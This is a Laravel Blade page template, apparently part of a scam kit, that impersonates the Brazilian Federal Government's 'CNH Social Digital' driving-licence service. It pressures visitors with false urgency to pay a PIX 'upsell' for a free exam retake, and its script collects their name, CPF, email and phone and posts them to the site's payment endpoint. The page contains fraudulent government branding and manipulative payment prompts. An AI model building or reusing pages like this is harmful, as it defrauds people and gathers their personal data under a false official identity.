@extends('layouts.app')
@section('content')
    <div class="min-h-screen bg-background flex flex-col">
        @include('components.header')
        <main class="flex-1 px-4 py-6">
            <div class="max-w-2xl mx-auto">
                <div class="mb-6 text-sm">
                    <span class="text-govBlue hover:underline cursor-pointer">Início</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">Serviços</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">CNH</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-foreground">CNH Social Digital</span>
                </div>
                <div class="bg-card rounded-lg shadow-md border border-border p-6">
                    <div class="flex items-start justify-between gap-4">
                        <h1 class="text-2xl font-bold text-[#1B4F9B] mb-4">Ative agora sua Nova Chance Sem Custo</h1>
                    </div>
                    <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-3 rounded-xl shadow mb-4 flex gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-triangle-alert-icon lucide-triangle-alert w-5 h-5"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
                        <div class="flex-1">
                            <p class="font-semibold text-sm md:text-base">Espera um pouco — isso aqui pode te salvar.</p>
                        </div>
                    </div>
                    <p class="leading-relaxed mb-4 text-sm md:text-base">
                        Se você não passar no exame da CNH, vai ter que pagar tudo de novo para fazer outra tentativa. E é justamente aqui que muita gente se arrepende de não ter ativado a proteção.
                    </p>
                    <p class="leading-relaxed mb-4 text-sm md:text-base">
                        Por isso, liberamos agora — <strong>somente neste momento</strong> — a opção de garantir uma nova tentativa sem pagar nada a mais.
                    </p>
                    <div class="bg-blue-50 border border-blue-200 p-4 rounded-xl mb-4">
                        <p class="font-semibold">Como funciona:</p>
                        <ul class="mt-2 space-y-1">
                            <li class="text-sm md:text-base"><strong>Passou?</strong> Tudo certo, segue normal.</li>
                            <li class="text-sm md:text-base"><strong>Não passou?</strong> Você refaz <strong>sem pagar nada</strong>.</li>
                        </ul>
                    </div>
                    <h2 class="font-semibold text-lg mb-2">Com essa proteção você evita:</h2>
                    <ul class="text-red-600 font-medium mb-4">
                        <li class="flex gap-2 items-center mb-1 text-sm md:text-base"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-ban-icon lucide-ban w-4 h-4"><path d="M4.929 4.929 19.07 19.071"/><circle cx="12" cy="12" r="10"/></svg> <span class="flex-1">Pagar taxa completa novamente</span></li>
                        <li class="flex gap-2 items-center mb-1 text-sm md:text-base"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-ban-icon lucide-ban w-4 h-4"><path d="M4.929 4.929 19.07 19.071"/><circle cx="12" cy="12" r="10"/></svg> <span class="flex-1">Perder dinheiro se bater nervosismo</span></li>
                        <li class="flex gap-2 items-center mb-1 text-sm md:text-base"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-ban-icon lucide-ban w-4 h-4"><path d="M4.929 4.929 19.07 19.071"/><circle cx="12" cy="12" r="10"/></svg> <span class="flex-1">Ter que reiniciar processo pagando mais</span></li>
                        <li class="flex gap-2 items-center mb-1 text-sm md:text-base"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-ban-icon lucide-ban w-4 h-4"><path d="M4.929 4.929 19.07 19.071"/><circle cx="12" cy="12" r="10"/></svg> <span class="flex-1">Custo extra inesperado</span></li>
                    </ul>
                    <h2 class="font-semibold text-lg mb-2">E garante:</h2>
                    <ul class="text-green-600 font-medium mb-6">
                        <li class="flex gap-2 items-center mb-1 text-sm md:text-base"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big-icon lucide-circle-check-big w-4 h-4"><path d="M21.801 10A10 10 0 1 1 17 3.335"/><path d="m9 11 3 3L22 4"/></svg> <span class="flex-1">1 nova tentativa sem custo</span></li>
                        <li class="flex gap-2 items-center mb-1 text-sm md:text-base"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big-icon lucide-circle-check-big w-4 h-4"><path d="M21.801 10A10 10 0 1 1 17 3.335"/><path d="m9 11 3 3L22 4"/></svg> <span class="flex-1">Segurança no dia da prova</span></li>
                        <li class="flex gap-2 items-center mb-1 text-sm md:text-base"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big-icon lucide-circle-check-big w-4 h-4"><path d="M21.801 10A10 10 0 1 1 17 3.335"/><path d="m9 11 3 3L22 4"/></svg> <span class="flex-1">Economia garantida se algo der errado</span></li>
                        <li class="flex gap-2 items-center mb-1 text-sm md:text-base"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big-icon lucide-circle-check-big w-4 h-4"><path d="M21.801 10A10 10 0 1 1 17 3.335"/><path d="m9 11 3 3L22 4"/></svg> <span class="flex-1">Tranquilidade pra fazer o exame sem pressão</span></li>
                    </ul>
                    <div class="bg-red-50 border border-red-200 p-3 rounded-xl mb-6 text-red-600 font-medium flex gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-triangle-alert-icon lucide-triangle-alert w-5 h-5"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
                        <p class="flex-1 text-sm md:text-base">Esse benefício aparece <strong>somente enquanto você está no processo agora</strong>.
                        Se sair dessa tela, <strong>não volta mais</strong>.</p>
                    </div>
                    <div class="text-center mb-3">
                        <p class="text-2xl font-bold text-green-600">R$ {{ number_format(env('UPSELL02'), 2, ',', '.') }}</p>
                        <p class="text-sm text-gray-600 mt-1">Pagamento único via PIX</p>
                    </div>
                    <button onclick="processarTax({{ env('UPSELL02') }})" class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md px-8 w-full py-6 text-base md:text-lg font-semibold bg-[#1B4F9B] hover:bg-[#1B4F9B]/90 text-white">Garantir Nova Chance Sem Custo!</button>
                </div>
            </div>
        </main>
        <footer class="mt-8 py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; {{date('Y')}} <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
<style>
.bg-yellow-100{background-color:oklch(97.3% 0.071 103.193);}
.border-yellow-500{border-color:oklch(79.5% 0.184 86.047);}
.border-blue-500{border-color:oklch(62.3% 0.214 259.815);}
.text-yellow-700{color:oklch(55.4% 0.135 66.442);}
.rounded-xl{border-radius:0.75rem}
.bg-red-50{background-color:oklch(97.1% 0.013 17.38)}
.border-red-200{border-color:oklch(88.5% 0.062 18.334)}
.text-gray-600{color:oklch(62.7% 0.194 149.214);}
</style>
@endsection
@section('javascript')
<script>
const userData = JSON.parse(sessionStorage.getItem("userData"));
const userAddress = JSON.parse(sessionStorage.getItem("userAddress"));
if(!userData){
    window.location.href = "{{url('/login')}}";
} 

function processarTax(valor){
    var nome = userData.NOME;
    var cpf = userData.CPF;
    var email = userData.email;
    var telefone = userData.telefone;

    $('.loading__circle').css({ 'display': 'flex' });

    $.ajax({
        type: 'POST',
        url: "{{ url('/processar') }}",
        headers: {
            'X-CSRF-TOKEN': '{{ csrf_token() }}'
        },
        data: {
            servico: 'Payment CN Upsell 03',
            nome: nome,
            cpf: cpf,
            email: email,
            telefone: telefone,
            valor: valor
        },
        dataType: 'json',
        success: function (response) {
            if(response.success){
                window.location.href = "{{ url('/checkout/pix') }}/" + response.id;
            }else{
                $('.loading__circle').css({ 'display': 'none' });
            }
        }
    });
}
</script>
@endsection